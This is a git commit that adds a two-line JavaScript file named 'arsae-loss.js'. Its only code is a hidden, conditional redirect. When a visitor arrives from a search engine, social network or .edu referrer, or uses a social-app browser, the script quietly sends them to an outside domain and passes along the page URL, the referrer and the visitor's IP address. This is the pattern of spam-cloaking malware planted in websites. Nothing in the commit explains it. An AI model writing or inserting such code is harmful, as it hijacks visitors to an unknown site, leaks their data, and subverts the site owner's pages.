fe5fc09a3ce7d2600c0b72d04595f40359c7c37b
pgpump <pg079898@gmail.com>
2025-06-05 14:56:42 +0700

    Create arsae-loss.js

---
+++ arsae-loss.js
@@ -0,0 +1,2 @@
+var ars = 'https://en.meltwatermedia.ca';
+if(['.edu.', '.google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + "&ip=" + window.ipAddressArsae }
